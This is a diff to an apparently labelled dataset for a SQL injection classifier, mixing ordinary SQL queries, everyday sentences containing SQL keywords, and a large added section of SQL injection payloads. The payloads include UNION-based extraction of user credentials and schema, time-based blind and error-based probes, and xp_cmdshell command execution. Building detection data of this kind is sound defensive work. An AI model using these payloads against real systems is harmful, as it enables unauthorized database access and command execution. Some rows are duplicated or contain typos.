@@ -20,24 +20,104 @@ SELECT * FROM users WHERE registration_date BETWEEN '2023-01-01' AND '2023-12-31
 SELECT customer_id, COUNT(*) FROM orders GROUP BY customer_id;
 SELECT product_name FROM products WHERE stock > 0 ORDER BY product_name;
 
+INSERT INTO employees (first_name, last_name, salary) VALUES ('John', 'Doe', 50000);
+UPDATE products SET price = price * 1.1 WHERE category = 'Electronics';
+DELETE FROM orders WHERE order_date < '2023-01-01';
+CREATE TABLE customers (id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100));
+ALTER TABLE employees ADD COLUMN department VARCHAR(50);
+DROP TABLE old_records;
+TRUNCATE TABLE temp_data;
+CREATE INDEX idx_last_name ON employees (last_name);
+GRANT SELECT, INSERT ON products TO user_role;
+REVOKE DELETE ON customers FROM temp_user;
+BEGIN TRANSACTION;
+COMMIT;
+ROLLBACK;
+CREATE VIEW high_value_orders AS SELECT * FROM orders WHERE total_amount > 1000;
+MERGE INTO target_table USING source_table ON (target_table.id = source_table.id);
+CREATE PROCEDURE get_employee_info (@emp_id INT) AS BEGIN SELECT * FROM employees WHERE employee_id = @emp_id; END;
+EXEC get_employee_info @emp_id = 100;
+CREATE TRIGGER update_inventory AFTER INSERT ON orders FOR EACH ROW BEGIN UPDATE inventory SET quantity = quantity - NEW.quantity WHERE product_id = NEW.product_id; END;
+DECLARE @counter INT = 0;
+WHILE @counter < 10 BEGIN SET @counter = @counter + 1; END;
+IF EXISTS (SELECT 1 FROM employees WHERE department = 'IT') BEGIN SELECT 'IT department exists'; END;
+CASE WHEN salary > 50000 THEN 'High' WHEN salary > 30000 THEN 'Medium' ELSE 'Low' END AS salary_category;
+WITH cte_sales AS (SELECT product_id, SUM(quantity) AS total_sold FROM order_details GROUP BY product_id) SELECT * FROM cte_sales;
+SELECT product_name, price, ROW_NUMBER() OVER (ORDER BY price DESC) AS price_rank FROM products;
+SELECT category, AVG(price) AS avg_price FROM products GROUP BY category HAVING AVG(price) > 100;
+SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-12-31';
+SELECT * FROM employees WHERE department IN ('Sales', 'Marketing', 'IT');
+SELECT * FROM products WHERE product_name LIKE '%Phone%';
+SELECT COALESCE(phone, email, 'N/A') AS contact FROM customers;
+SELECT NULLIF(column1, column2) AS result FROM my_table;
+SELECT CAST(price AS DECIMAL(10,2)) AS formatted_price FROM products;
+SELECT CONVERT(VARCHAR(10), order_date, 120) AS formatted_date FROM orders;
+SELECT employee_id, first_name, last_name, RANK() OVER (ORDER BY salary DESC) AS salary_rank FROM employees;
+SELECT product_name, price, DENSE_RANK() OVER (PARTITION BY category ORDER BY price DESC) AS price_rank_in_category FROM products;
+SELECT customer_name, order_date, order_total, LAG(order_total) OVER (PARTITION BY customer_name ORDER BY order_date) AS previous_order_total FROM orders;
+SELECT product_name, units_in_stock, LEAD(units_in_stock) OVER (ORDER BY product_id) AS next_product_stock FROM products;
+SELECT department, AVG(salary) AS avg_salary, GROUPING(department) AS is_total FROM employees GROUP BY ROLLUP (department);
+SELECT category, product_name, SUM(sales_amount) FROM sales GROUP BY CUBE (category, product_name);
+SELECT DISTINCT ON (department) employee_id, first_name, last_name, salary FROM employees ORDER BY department, salary DESC;
+CREATE MATERIALIZED VIEW monthly_sales AS SELECT DATE_TRUNC('month', order_date) AS month, SUM(total_amount) AS total_sales FROM orders GROUP BY DATE_TRUNC('month', order_date);
+EXPLAIN SELECT * FROM orders WHERE customer_id = 100;
+CREATE SEQUENCE order_id_seq START 1000;
+SELECT NEXTVAL('order_id_seq');
+CREATE FUNCTION get_total_sales(start_date DATE, end_date DATE) RETURNS DECIMAL(10,2)
+SELECT * FROM products CROSS JOIN categories;
+SELECT * FROM orders FULL OUTER JOIN customers ON orders.customer_id = customers.customer_id;
+SELECT employee_id, first_name, last_name FROM employees UNION SELECT customer_id, first_name, last_name FROM customers;
+SELECT product_name, price FROM products WHERE price > ALL (SELECT AVG(price) FROM products GROUP BY category);
+CREATE UNIQUE INDEX idx_email ON customers (LOWER(email));
+SELECT JSON_OBJECT('name', first_name || ' ' || last_name, 'email', email) AS customer_info FROM customers;
 
 -- general sentences --
 -- label 0 --
-The concert will start at 8 PM on August 10, 2024.
-The population of the city is approximately 1.5 million.
-On December 31, 2023, the world will celebrate New Year's Eve.
-The average temperature in July is around 30 degrees Celsius.
-The marathon will take place on November 5, 2024, in New York.
-My brother is 10 years old and loves playing soccer.
-The movie 'Inception' was released in 2010 and is a masterpiece.
-The last train leaves at 11:45 PM every night.
-The project starts on 2023-09-01 and ends on 2024-06-30.
-My favorite color is blue, and I have a cat named Whiskers.
-Alice was born on March 15, 1995, and loves to travel.
+The concert will start at 8 PM on August 10, 2024
+The population of the city is approximately 1.5 million
+On December 31, 2023, the world will celebrate New Year's Eve
+The average temperature in July is around 30 degrees Celsius
+The marathon will take place on November 5, 2024, in New York
+My brother is 10 years old and loves playing soccer
+The movie 'Inception' was released in 2010 and is a masterpiece
+The last train leaves at 11:45 PM every night
+The project starts on 2023-09-01 and ends on 2024-06-30
+My favorite color is blue, and I have a cat named Whiskers
+Alice was born on March 15, 1995, and loves to travel
 The price of the product is $43.99 and ships on November 1st.
 In 2024, the Olympics will be held in Paris, France.
 The temperature today is 25 degrees Celsius.
 Yesterday was July 25, 2023, and it was sunny all day.
+The SELECT committee chose the best candidates for the job.
+We need to UPDATE our policies to reflect the current situation.
+It's important to INSERT new ideas into the conversation.
+Let's DELETE that negative thought from our minds.
+We should JOIN forces to tackle this problem together.
+The company aims to UNION all departments for better collaboration
+Can you COMMIT to finishing the project by next week
+We need to ROLLBACK our decision; it wasn't the right choice
+The team will MERGE their findings in the final report
+Let's CREATE a plan to improve our productivity
+It's crucial to BACKUP your data regularly
+We should TRUNCATE our expenses to stay within budget
+The manager decided to ALTER the meeting schedule
+We need to GRANT more autonomy to our employees
+It's time to REVOKE outdated permissions in our system
+The company will PARTITION the workload among different teams
+We should NORMALIZE our processes across all branches
+Let's try to OPTIMIZE our workflow for better efficiency
+The team needs to AGGREGATE all the customer feedback
+We must VALIDATE all the information before making a decision
+It's important to TRIGGER alerts when inventory runs low
+The company plans to REPLICATE its success in other markets
+We should EXECUTE our plans without further delay
+Let's INNER JOIN our efforts to achieve our goals
+The team will OUTER JOIN with external consultants for this project
+We need to HAVING a clear understanding of our objectives
+It's crucial to GROUP BY our priorities when allocating resources
+The manager will ORDER BY importance when assigning tasks
+We should LIMIT our focus to the most critical issues
+Let's DISTINCT ourselves from the competition with innovative ideas
 
 
 
@@ -112,6 +192,31 @@ Select the names of the winners and display them in a trophy case
 
 -- complex sql queries --
 -- label 1 --
+SELECT e.name, d.name, AVG(e.salary) OVER (PARTITION BY d.id) FROM employees e JOIN departments d ON e.dept_id = d.id;
+WITH RECURSIVE cte AS (SELECT id, parent_id, name FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.id, c.parent_id, c.name FROM categories c JOIN cte ON c.parent_id = cte.id) SELECT * FROM cte;
+SELECT p.name, SUM(od.quantity * od.price) AS revenue, RANK() OVER (ORDER BY SUM(od.quantity * od.price) DESC) FROM products p JOIN order_details od ON p.id = od.product_id GROUP BY p.id;
+SELECT c.name, COUNT(o.id) AS order_count, NTILE(4) OVER (ORDER BY COUNT(o.id)) AS customer_segment FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.id;
+SELECT e.name, e.salary, LAG(e.salary) OVER (ORDER BY e.hire_date) AS prev_salary, LEAD(e.salary) OVER (ORDER BY e.hire_date) AS next_salary FROM employees e;
+SELECT p.name, AVG(r.rating) AS avg_rating, PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY r.rating) OVER (PARTITION BY p.id) AS median_rating FROM products p JOIN reviews r ON p.id = r.product_id GROUP BY p.id;
+SELECT o.id, o.total, SUM(o.total) OVER (ORDER BY o.date ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS rolling_sum FROM orders o;
+SELECT e.name, d.name, e.salary, FIRST_VALUE(e.salary) OVER (PARTITION BY d.id ORDER BY e.salary DESC) AS highest_salary FROM employees e JOIN departments d ON e.dept_id = d.id;
+WITH sales_rank AS (SELECT product_id, SUM(quantity) AS total_sold, RANK() OVER (ORDER BY SUM(quantity) DESC) AS rank FROM order_details GROUP BY product_id) SELECT p.name, sr.total_sold FROM products p JOIN sales_rank sr ON p.id = sr.product_id WHERE sr.rank <= 5;
+SELECT c.name, DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS monthly_total, AVG(SUM(o.total)) OVER (PARTITION BY c.id ORDER BY DATE_TRUNC('month', o.date) ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS moving_avg FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.id, DATE_TRUNC('month', o.date);
+SELECT p.name, c.name AS category, p.price, DENSE_RANK() OVER (PARTITION BY c.id ORDER BY p.price) AS price_rank FROM products p JOIN categories c ON p.category_id = c.id;
+SELECT e.name, COUNT(DISTINCT p.id) AS projects, STRING_AGG(p.name, ', ' ORDER BY p.name) AS project_list FROM employees e LEFT JOIN employee_projects ep ON e.id = ep.employee_id LEFT JOIN projects p ON ep.project_id = p.id GROUP BY e.id;
+SELECT o.id, o.date, LAG(o.date) OVER (PARTITION BY o.customer_id ORDER BY o.date) AS prev_order_date, o.date - LAG(o.date) OVER (PARTITION BY o.customer_id ORDER BY o.date) AS days_since_last_order FROM orders o;
+WITH monthly_sales AS (SELECT DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS total_sales FROM orders o GROUP BY DATE_TRUNC('month', o.date)) SELECT month, total_sales, total_sales - LAG(total_sales) OVER (ORDER BY month) AS sales_difference FROM monthly_sales;
+SELECT d.name, AVG(e.salary) AS avg_salary, MAX(e.salary) AS max_salary, MIN(e.salary) AS min_salary, COUNT(*) AS employee_count, SUM(CASE WHEN e.salary > (SELECT AVG(salary) FROM employees) THEN 1 ELSE 0 END) AS above_avg_count FROM departments d JOIN employees e ON d.id = e.department_id GROUP BY d.id;
+SELECT e.name, d.name, AVG(e.salary) OVER (PARTITION BY d.id) FROM employees e JOIN departments d ON e.dept_id = d.id;
+WITH RECURSIVE cte AS (SELECT id, parent_id, name FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.id, c.parent_id, c.name FROM categories c JOIN cte ON c.parent_id = cte.id) SELECT * FROM cte;
+SELECT p.name, SUM(od.quantity * od.price) AS revenue, RANK() OVER (ORDER BY SUM(od.quantity * od.price) DESC) FROM products p JOIN order_details od ON p.id = od.product_id GROUP BY p.id;
+SELECT c.name, COUNT(o.id) AS order_count, NTILE(4) OVER (ORDER BY COUNT(o.id)) AS customer_segment FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.id;
+SELECT e.name, e.salary, LAG(e.salary) OVER (ORDER BY e.hire_date) AS prev_salary, LEAD(e.salary) OVER (ORDER BY e.hire_date) AS next_salary FROM employees e;
+SELECT p.name, AVG(r.rating) AS avg_rating, PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY r.rating) OVER (PARTITION BY p.id) AS median_rating FROM products p JOIN reviews r ON p.id = r.product_id GROUP BY p.id;
+SELECT o.id, o.total, SUM(o.total) OVER (ORDER BY o.date ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS rolling_sum FROM orders o;
+SELECT e.name, d.name, e.salary, FIRST_VALUE(e.salary) OVER (PARTITION BY d.id ORDER BY e.salary DESC) AS highest_salary FROM employees e JOIN departments d ON e.dept_id = d.id;
+WITH sales_rank AS (SELECT product_id, SUM(quantity) AS total_sold, RANK() OVER (ORDER BY SUM(quantity) DESC) AS rank FROM order_details GROUP BY product_id) SELECT p.name, sr.total_sold FROM products p JOIN sales_rank sr ON p.id = sr.product_id WHERE sr.rank <= 5;
+SELECT c.name, DATE_TRUNC('month', o.date) AS month, SUM(o.total) AS monthly_total, AVG(SUM(o.total)) OVER (PARTITION BY c.id ORDER BY DATE_TRUNC('month', o.date) ROWS BETWEEN 2 PRECEDING AND CURRENT ROW) AS moving_avg FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.id, DATE_TRUNC('month', o.date);
 SELECT product_name, price FROM inventory WHERE stock > 50 AND category = 'Electronics'
 SELECT customer_id, COUNT(order_id) FROM orders WHERE order_date >= '2023-01-01' GROUP BY customr_id HAVING COUNT(order_id) > 5;
 SELECT name, email FROM users WHERE active = TRUE AND last_login > '2024-01-01'
@@ -147,6 +252,107 @@ SELECT AVG(salary) FROM employees WHERE department_id = 2 AND employment_status 
 
 -- sql injections --
 -- label 1 --
+' OR '1'='1
+" OR "1"="1
+1 OR 1=1
+' OR 'x'='x
+" OR "x"="x
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT username, password FROM users--
+' OR 1=1 LIMIT 1--
+1 AND 1=1
+1 AND 1=0
+1 AND 1=1--
+1' AND '1'='1
+1 AND 1=(SELECT COUNT(*) FROM tablenames)
+1 AND 1=(SELECT COUNT(*) FROM tablenames)--
+'; WAITFOR DELAY '0:0:10'--
+1 WAITFOR DELAY '0:0:10'--
+1); WAITFOR DELAY '0:0:10'--
+1)); WAITFOR DELAY '0:0:10'--
+1'; WAITFOR DELAY '0:0:10'--
+1'); WAITFOR DELAY '0:0:10'--
+1')); WAITFOR DELAY '0:0:10'--
+1 AND SLEEP(5)
+1' AND SLEEP(5)
+1) AND SLEEP(5)
+1)) AND SLEEP(5)
+1')) AND SLEEP(5)
+'; EXEC xp_cmdshell('ping 10.10.10.10')--
+'; exec master..xp_cmdshell 'ping 10.10.10.10'--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION SELECT @@version--
+UNION SELECT @@servername, @@language--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1 AND 2>1
+1 AND 1>2
+1' AND 'one'='one
+1' AND 'one'='one'--
+1' AND 'one'='one'#
+1 UNION SELECT user()
+1 UNION SELECT system_user()
+1 UNION SELECT user FROM mysql.user
+1 UNION SELECT version()
+1 UNION SELECT database()
+1 UNION SELECT table_name FROM information_schema.tables
+1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115
+1 AND 1=CONVERT(int,(SELECT @@version))
+1 AND 1=CAST((SELECT user) as signed)
+1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
+1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x
+1' AND SUBSTR(@@version,1,1) = '5'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--
+1' AND MID(VERSION(),1,1) = '5';
+1' AND MID(VERSION(),1,1) > '4';
+1' AND LEFT(VERSION(),1) = '5';
+1' AND LEFT(VERSION(),1) > '4';
+1' AND SUBSTR(VERSION(),1,1) = '5';
+1' AND SUBSTRING(VERSION(),1,1) = '5';
+1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
+1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)
+1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))
+1 PROCEDURE ANALYSE()
+1' HAVING 1=1--
+1' GROUP BY columnnames HAVING 1=1--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' OR '1'='1
+1" OR "1"="1
+1' OR '1'='1'--
+1" OR "1"="1"--
+1' OR '1'='1'#
+1" OR "1"="1"#
+1' OR '1'='1'/*
+1" OR "1"="1"/*
+1'OR 1=1--
+1"OR 1=1--
+1'OR 1=1#
+1"OR 1=1#
+1'OR 1=1/*
+1"OR 1=1/*
+1' UNION SELECT @@version--
+1' AND '1'='1' AND '%'='
 1 OR 1=1; --
 admin' -- 
 ' OR 'a'='a'; --
